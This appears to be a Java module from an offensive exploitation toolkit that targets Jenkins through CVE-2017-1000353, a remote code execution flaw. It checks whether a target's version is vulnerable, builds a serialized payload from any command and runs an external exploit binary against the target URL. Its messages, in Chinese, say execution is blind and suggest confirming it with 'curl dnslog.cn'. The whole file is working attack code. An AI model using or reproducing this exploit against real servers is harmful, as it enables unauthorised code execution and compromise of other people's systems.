package fun.fireline.exp.jenkins;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.Jenkins_Info;

import java.util.jar.JarEntry;

import static fun.fireline.exp.tools.Payload.exploit;
import static fun.fireline.tools.Tools.compareVersion;


public class CVE_2017_1000353 implements ExploitInterface {

    private String url = "";
    private boolean isVul = false;
    private Jenkins_Info jenkins_info = new Jenkins_Info();

    @Override
    public String checkVul(String url) {
        this.url = url;
        String version = jenkins_info.get_Jenkions_Info(url);
        if(version==null){
            return "[-] 目标非Jenkins";
        }
        String basic = "CVE-2017-1000353 Jenkins-CI 无回显远程代码执行漏洞,请从文件读取/命令执行模块自行判断 eg: curl dnslog.cn (command)";
        if(compareVersion(version,"2.56","2.46.1")){
            this.isVul = true;
            return "[+] 目标版本处于漏洞版本之内, 可能存在"+basic;
        }
        return "[-] 目标版本处于漏洞版本之外, 可能不存在"+basic;
    }

    @Override
    public String exeCmd(String cmd, String encoding) throws Exception {
        exploit(cmd);
        String os = jenkins_info.getSystem();
        String exp = "";
        if(os.contains("win")){
            exp = "CVE_2017_1000353.exe";
        }else if(os.contains("linux")){
            exp = "./CVE_2017_1000353";
        }
        String command = String.format("%s %s payload2.ser",exp,this.url);
        System.out.println(command);
        Process process = Runtime.getRuntime().exec(command);
        process.waitFor();
        return "无回显命令执行,请自行验证";
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }

}